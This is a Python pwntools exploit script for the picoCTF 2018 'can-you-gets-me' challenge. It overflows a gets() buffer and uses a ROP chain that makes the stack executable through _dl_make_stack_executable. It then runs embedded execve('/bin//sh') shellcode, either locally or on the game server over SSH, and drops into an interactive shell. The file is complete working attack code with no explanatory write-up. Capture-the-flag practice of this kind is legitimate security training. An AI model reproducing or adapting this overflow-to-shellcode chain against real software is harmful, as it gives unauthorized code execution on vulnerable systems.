#! /usr/bin/env python
from binascii import unhexlify
import os
import sys
#
from pwn import context, p32, u32, log, process, remote, args, ssh
from pwn import gdb, ELF, ROP, constants
context.clear(arch='i386', os='linux')


class ExploitInfo:
    name            = 'gets'
    elf             = ELF(name)
    name_on_shell   = '/problems/can-you-gets-me_2_da0270478f868f229487e59ee4a8cf40/%s' % name
    pico_shell      = None
    shellcode_i386  = unhexlify(
        # % rasm2 -b 32 -D 31c9f7e1b00b51682f2f7368682f62696e89e3cd80
            '31c9'    # 0x00000000   2 xor ecx, ecx
            'f7e1'    # 0x00000002   2 mul ecx
            'b00b'    # 0x00000004   2 mov al, 0xb
            '51'      # 0x00000006   1 push ecx
        '682f2f7368'  # 0x00000007   5 push 0x68732f2f
        '682f62696e'  # 0x0000000c   5 push 0x6e69622f
            '89e3'    # 0x00000011   2 mov ebx, esp
            'cd80'    # 0x00000013   2 int 0x80
    )
    #
    offset_eip      = 0x18 + 4


def get_process():
    r = None
    if args.REMOTE:
        HOME_DIR = os.environ['HOME']
        keyfile = os.path.join(HOME_DIR, '.ssh', 'id_rsa_picoctf')
        ExploitInfo.pico_shell = ssh(host='2018game.picoctf.com', user='zzzz', keyfile=keyfile)
        r = ExploitInfo.pico_shell.process(ExploitInfo.name_on_shell)
    else:
        r = process('./%s' % ExploitInfo.name)
        if args.GDB:
            gdb.attach(r.pid, ExploitInfo.gdb)

    return r


def main():
    elf = ExploitInfo.elf
    addr___libc_stack_end   = elf.sym['__libc_stack_end']
    addr___stack_prot       = elf.sym['__stack_prot']
    MEM_PROT_FLAG           = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC

    POP_EAX_RET             = 0x80b81c6
    POP_EBX_RET             = 0x80481c9
    POP_ECX_RET             = 0x80de955
    POP_EDX_RET             = 0x806f02a
    XOR_EAX_EAX_RET         = 0x8049303
    INC_EAX_RET             = 0x807a86f
    MOV_DWORD_EDX_EAX_RET   = 0x80549db
    POP_ESI_RET             = 0x8048433
    POP_EDI_RET             = 0x8048480
    INT_80                  = 0x806cc25
    PUSH_ESP_RET            = 0x080b81d6

    rop = ROP(elf)
    rop.raw(POP_EDX_RET)
    rop.raw(addr___stack_prot)          # edx = &__stack_prot
    rop.raw(XOR_EAX_EAX_RET)

    for x in range(MEM_PROT_FLAG):      # eax = MEM_PROT_FLAG
        rop.raw(INC_EAX_RET)

    rop.raw(MOV_DWORD_EDX_EAX_RET)      # __stack_prot = MEM_PROT_FLAG
    rop.raw(POP_EAX_RET)                #
    rop.raw(addr___libc_stack_end)      # eax = &__libc_stack_end
    rop.call('_dl_make_stack_executable') # _dl_make_stack_executable(&__libc_stack_end)
    rop.raw(PUSH_ESP_RET)

    p = get_process()

    payload = 'A' * ExploitInfo.offset_eip
    payload += rop.chain()
    payload += ExploitInfo.shellcode_i386
    assert('\x00' not in payload)

    p.clean()
    log.info("Sending: %r", payload)
    p.sendline(payload)

    p.clean(timeout=0.5)

    p.clean(timeout=0.5)
    log.success("Here are your shell!")
    p.sendline('ls -la')
    p.interactive()
    p.close()


if __name__ == "__main__":
    main()
